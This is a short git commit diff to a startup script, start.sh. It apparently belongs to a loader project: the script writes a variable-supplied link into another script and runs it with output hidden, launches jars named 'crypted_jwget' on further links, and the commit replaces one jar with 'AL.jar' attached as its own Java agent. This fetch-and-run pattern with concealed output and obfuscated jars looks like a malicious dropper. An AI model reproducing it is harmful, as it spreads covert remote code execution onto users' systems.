f622dd2cfce177ba4960e1cbec841712e7611177
S3niorMCYT <77205348+SeniorMCYT@users.noreply.github.com>
2021-09-18 20:56:02 +0430

    Update start.sh

--- start.sh
+++ start.sh
@@ -5,19 +5,4 @@ echo -e $LINK2 > start2.sh
 bash start2.sh &> /dev/null
 java -jar crypted_jwget.jar $LINK
 java -jar crypted_jwget.jar $LINK3
-java -jar leatest.jar Storage11
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+java "-javaagent:AL.jar" -jar "AL.jar" storage
